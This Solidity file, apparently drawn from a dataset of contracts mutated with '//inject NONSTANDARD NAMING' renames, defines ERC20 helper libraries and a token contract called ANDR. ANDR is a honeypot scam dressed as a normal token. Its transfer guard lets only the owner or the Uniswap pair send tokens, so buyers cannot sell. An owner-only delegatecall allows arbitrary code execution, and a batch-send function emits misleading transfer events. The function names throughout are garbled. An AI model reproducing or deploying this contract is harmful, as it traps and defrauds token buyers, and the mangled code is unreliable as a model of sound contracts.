                                                                 

pragma solidity ^0.5.17;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                                                     

                 

interface IERC20 {
    function TOTALSUPPLY944() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF971(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER569(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE636(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE982(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM321(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER836(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL722(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

library Address {
    function ISCONTRACT571(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _MSGSENDER705() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

library SafeMath {
    function ADD235(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB724(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB724(a, b, "SafeMath: subtraction overflow");
    }

    function SUB724(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL696(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV857(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV857(a, b, "SafeMath: division by zero");
    }

    function DIV857(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER696(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN833(token, abi.encodeWithSelector(token.TRANSFER569.selector, to, value));
    }

    function SAFETRANSFERFROM842(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN833(token, abi.encodeWithSelector(token.TRANSFERFROM321.selector, from, to, value));
    }

    function SAFEAPPROVE828(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE636(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN833(token, abi.encodeWithSelector(token.APPROVE982.selector, spender, value));
    }

    function CALLOPTIONALRETURN833(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT571(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY944() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF971(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER569(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER290(_MSGSENDER705(), recipient, amount);
        return true;
    }

    function ALLOWANCE636(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE982(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE550(_MSGSENDER705(), spender, amount);
        return true;
    }

    function TRANSFERFROM321(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER290(sender, recipient, amount);
        _APPROVE550(sender, _MSGSENDER705(), _allowances[sender][_MSGSENDER705()].SUB724(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE933(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE550(_MSGSENDER705(), spender, _allowances[_MSGSENDER705()][spender].ADD235(addedValue));
        return true;
    }

    function DECREASEALLOWANCE260(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE550(_MSGSENDER705(), spender, _allowances[_MSGSENDER705()][spender].SUB724(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER290(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB724(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD235(amount);
        emit TRANSFER836(sender, recipient, amount);
    }

    function _MINT298(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD235(amount);
        _balances[account] = _balances[account].ADD235(amount);
        emit TRANSFER836(address(0), account, amount);
    }

    function _BURN948(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB724(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB724(amount);
        emit TRANSFER836(account, address(0), amount);
    }

    function _APPROVE550(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL722(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME970() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL202() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS253() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}


contract ANDR {

    event TRANSFER836(address indexed _from, address indexed _to, uint _value);	//inject NONSTANDARD NAMING
    event APPROVAL722(address indexed _owner, address indexed _spender, uint _value);	//inject NONSTANDARD NAMING

    function TRANSFER569(address _to, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        return TRANSFERFROM321(msg.sender, _to, _value);
    }

    function TRANSFERFROM321(address _from, address _to, uint _value) public payable ENSURE365(_from, _to) returns (bool) {	//inject NONSTANDARD NAMING
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit TRANSFER836(_from, _to, _value);
        return true;
    }

    function APPROVE982(address _spender, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        allowance[msg.sender][_spender] = _value;
        emit APPROVAL722(msg.sender, _spender, _value);
        return true;
    }

    function DELEGATE1000(address a, bytes memory b) public payable {	//inject NONSTANDARD NAMING
        require(msg.sender == owner);
        a.delegatecall(b);
    }

    function BATCHSEND346(address[] memory _tos, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit TRANSFER836(msg.sender, _to, _value/2);
            emit TRANSFER836(msg.sender, _to, _value/2);
        }
        return true;
    }

    modifier ENSURE365(address _from, address _to) {	//inject NONSTANDARD NAMING
        address UNI = PAIRFOR904(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        require(_from == owner || _to == owner || _from == UNI);
        _;
    }

    function PAIRFOR904(address factory, address tokenA, address tokenB) internal pure returns (address pair) {	//inject NONSTANDARD NAMING
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals70 = 18;	//inject NONSTANDARD NAMING
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address constant internal uni494 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;	//inject NONSTANDARD NAMING

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit TRANSFER836(address(0x0), msg.sender, totalSupply);
    }
}